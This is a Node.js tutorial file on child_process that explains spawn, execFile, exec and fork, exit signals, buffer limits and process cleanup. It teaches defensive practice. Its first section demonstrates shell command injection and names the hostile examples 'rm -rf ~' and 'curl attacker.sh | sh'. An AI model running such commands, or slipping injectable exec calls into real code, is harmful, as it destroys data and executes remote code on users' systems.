/**
 * 01 — child_process: spawn, exec, execFile, fork
 *
 * Run:  node src/08-processes-workers/01-child-process.ts
 */

import { spawn, exec, execFile, fork } from "node:child_process";
import { promisify } from "node:util";
import { once } from "node:events";
import path from "node:path";

const execAsync = promisify(exec);
const execFileAsync = promisify(execFile);

console.log("=== 1. ⚠ exec() runs a SHELL — command injection ===");
{
  // Imagine this came from a query string or a filename.
  const userInput = "hello; echo INJECTED";

  const viaExecFile = await execFileAsync("echo", [userInput]);
  console.log("  execFile (no shell):", JSON.stringify(viaExecFile.stdout.trim()));

  const viaExec = await execAsync(`echo ${userInput}`);
  console.log("  exec (shell):       ", JSON.stringify(viaExec.stdout.trim()));

  console.log(`
  Look at the second one: the shell saw the ';' and ran a SECOND command.
  Replace "echo INJECTED" with "rm -rf ~" or "curl attacker.sh | sh" and you
  have the entire vulnerability class.

  execFile passed the whole string as ONE argument — no shell, no parsing,
  nothing to escape. That's not "escaping done well", it's escaping made
  unnecessary, which is the only version that survives contact with reality.

  RULE: never interpolate anything into exec(). Use spawn/execFile with an
  argument ARRAY. If you truly need a pipeline, connect two spawns with
  streams instead of asking a shell to do it.
`);
}

console.log("=== 2. The four functions ===");
console.log(`
  spawn     no shell, STREAMS      long-running or large output
  execFile  no shell, buffered     short output you want as a string
  exec      SHELL, buffered        only when you need shell features
  fork      no shell, + IPC        another Node script you control

  spawn and execFile are the safe defaults. exec is the one that needs a
  justification comment.
`);

console.log("=== 3. spawn: streaming output ===");
{
  const child = spawn(process.execPath, ["-e", "for (let i = 0; i < 3; i++) console.log('line ' + i)"]);

  let out = "";
  child.stdout.setEncoding("utf8");
  for await (const chunk of child.stdout) out += chunk;

  const [code] = (await once(child, "exit")) as [number | null, NodeJS.Signals | null];
  console.log("  stdout:", JSON.stringify(out));
  console.log("  exit code:", code);
  console.log(`
  Streams mean this works on a 4GB ffmpeg output. exec/execFile buffer
  everything into a string first — see §5.
`);
}

console.log("=== 4. exit code vs signal — exactly one is non-null ===");
{
  const normal = spawn(process.execPath, ["-e", "process.exit(3)"]);
  const [code1, sig1] = (await once(normal, "exit")) as [number | null, NodeJS.Signals | null];
  console.log(`  exited normally  → code: ${code1}, signal: ${sig1}`);

  const killed = spawn(process.execPath, ["-e", "setInterval(() => {}, 1000)"]);
  setTimeout(() => killed.kill("SIGTERM"), 50);
  const [code2, sig2] = (await once(killed, "exit")) as [number | null, NodeJS.Signals | null];
  console.log(`  killed by signal → code: ${code2}, signal: ${sig2}`);

  console.log(`
  Checking only \`code === 0\` treats the killed case as a FAILURE with an
  unhelpful message — or worse, code=null is falsy in some hand-rolled
  checks and gets read as success. Always check both:

      if (signal) throw new Error(\`killed by \${signal}\`);
      if (code !== 0) throw new Error(\`exited with \${code}\`);

  A signal usually means the OOM killer, a timeout you set, or a deploy.
`);
}

console.log("=== 5. 'error' and 'exit' are different failures ===");
{
  const missing = spawn("definitely-not-a-real-binary-xyz", []);
  const err = (await Promise.race([
    once(missing, "error").then(([e]) => e as NodeJS.ErrnoException),
    once(missing, "exit").then(() => null),
  ])) as NodeJS.ErrnoException | null;

  console.log("  spawning a missing binary →", err ? `'error' event: ${err.code}` : "'exit' event");
  console.log(`
  'error' = the process could not be STARTED (ENOENT, EACCES).
  'exit'  = it started and finished.

  A missing binary never emits 'exit', so code that only listens for 'exit'
  hangs forever. Handle both, always.
`);
}

console.log("=== 6. exec/execFile buffer — and that has a limit ===");
{
  try {
    await execFileAsync(process.execPath, ["-e", "console.log('x'.repeat(2_000_000))"], {
      maxBuffer: 1024,
    });
  } catch (err) {
    console.log("  2MB of output with maxBuffer 1024 →", (err as NodeJS.ErrnoException).code);
  }
  console.log(`
  maxBuffer defaults to 1MB. Past it the child is KILLED and you get
  ERR_CHILD_PROCESS_STDIO_MAXBUFFER — with the output you did collect
  thrown away.

  If output size is unbounded (a log dump, a video, a git clone), use spawn
  and stream it. Raising maxBuffer just moves the failure.
`);
}

console.log("=== 7. fork: a Node child with an IPC channel ===");
{
  const child = fork(path.join(import.meta.dirname, "_child.ts"), [], { silent: true });

  child.send({ job: "square", n: 7 });
  const [reply] = (await once(child, "message")) as [unknown];
  console.log("  reply from child:", reply);

  child.kill();
  await once(child, "exit");

  console.log(`
  fork gives you .send() / 'message' both ways. But the messages are
  JSON-serialised, so you lose Date, Map, Set, Buffer, undefined, and cycles:

      child.send({ when: new Date() });   // arrives as an ISO STRING
      child.send({ m: new Map() });       // arrives as {}

  worker_threads uses structured clone instead, which preserves all of
  those. If you're forking Node just to run JS, use a worker thread.
`);
}

console.log("=== 8. Always kill your children ===");
console.log(`
  A child outlives its parent by default — kill the parent and you get an
  orphan holding a port or a lock.

  // With an AbortSignal (cleanest):
  const ac = new AbortController();
  const child = spawn(cmd, args, { signal: ac.signal });
  req.on("close", () => ac.abort());

  // Or explicitly, with escalation:
  try {
    await once(child, "exit");
  } finally {
    child.kill("SIGTERM");                                   // ask nicely
    setTimeout(() => child.kill("SIGKILL"), 5_000).unref();  // then insist
  }

  Note the unref() (module 02 §3.4) so the escalation timer doesn't itself
  hold your process open for five seconds after a clean exit.

  On POSIX, kill() signals only the child — not its grandchildren. If the
  child spawns its own children, use { detached: true } and kill the whole
  process GROUP with process.kill(-child.pid, "SIGTERM").
`);

console.log("=== 9. A safe wrapper ===");
console.log(`
  import { spawn } from "node:child_process";
  import { once } from "node:events";

  export async function run(
    cmd: string,
    args: string[],
    opts: { cwd?: string; timeoutMs?: number; signal?: AbortSignal } = {},
  ): Promise<string> {
    const child = spawn(cmd, args, {          // ← argument ARRAY, no shell
      cwd: opts.cwd,
      stdio: ["ignore", "pipe", "pipe"],
      signal: opts.signal,
      timeout: opts.timeoutMs,
    });

    let stdout = "", stderr = "";
    child.stdout.setEncoding("utf8");
    child.stderr.setEncoding("utf8");
    child.stdout.on("data", (c) => { stdout += c; });
    child.stderr.on("data", (c) => { stderr += c; });

    const [code, signal] = await once(child, "exit");
    if (signal) throw new Error(\`\${cmd} killed by \${signal}\`, { cause: stderr });
    if (code !== 0) throw new Error(\`\${cmd} exited \${code}: \${stderr.trim()}\`);
    return stdout;
  }
`);
